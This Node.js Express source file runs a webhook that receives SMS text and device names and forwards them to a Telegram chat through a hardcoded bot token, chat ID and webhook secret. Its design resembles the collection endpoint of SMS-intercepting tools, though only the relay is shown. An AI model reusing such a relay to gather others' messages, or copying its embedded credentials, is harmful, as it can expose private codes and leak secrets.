import express from "express";
const app = express();
const PORT = process.env.PORT || 10000;

// Your Telegram Bot credentials
const TELEGRAM_BOT_TOKEN = "8712348926:AAGSgG2F5_xOGWkNEoMfmn6Fr7AtBPG6_u0";
const TELEGRAM_CHAT_ID = "-1004392052306";
const WEBHOOK_SECRET = "sb_publishable_2eRAvmafnr_Ir6c6EgTHqQ_tSZRmUJJ";

const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

// Parse JSON body
app.use(express.json());

// Health check
app.get("/", (req, res) => {
  res.json({ status: "ok", message: "Webhook host is running" });
});

// Webhook endpoint
app.post("/webhook", async (req, res) => {
  try {
    // 1. Authentication
    const auth = req.headers.authorization;
    if (!auth || auth !== `Bearer ${WEBHOOK_SECRET}`) {
      return res.status(401).json({ error: "Unauthorized" });
    }

    // 2. Get data from request
    const { message, device_name } = req.body;
    
    if (!message) {
      return res.status(400).json({ error: "Missing field: message" });
    }

    // 3. Format Telegram message
    const deviceName = device_name || "Unknown Device";
    const timestamp = new Date().toLocaleString();
    
    const telegramText = `📱 New SMS received 🍆💪\n\n🎯 ${deviceName}\n✍️ ${message}\n🕐 ${timestamp}`;

    // 4. Send to Telegram
    const telegramResponse = await fetch(TELEGRAM_API_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: telegramText,
        parse_mode: "HTML",
      }),
    });

    const telegramResult = await telegramResponse.json();

    if (!telegramResponse.ok) {
      console.error("Telegram error:", telegramResult);
      return res.status(500).json({ error: "Failed to send Telegram message" });
    }

    // 5. Success
    res.json({ 
      success: true, 
      message: "SMS forwarded to Telegram" 
    });

  } catch (error) {
    console.error("Error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Webhook host running on port ${PORT}`);
});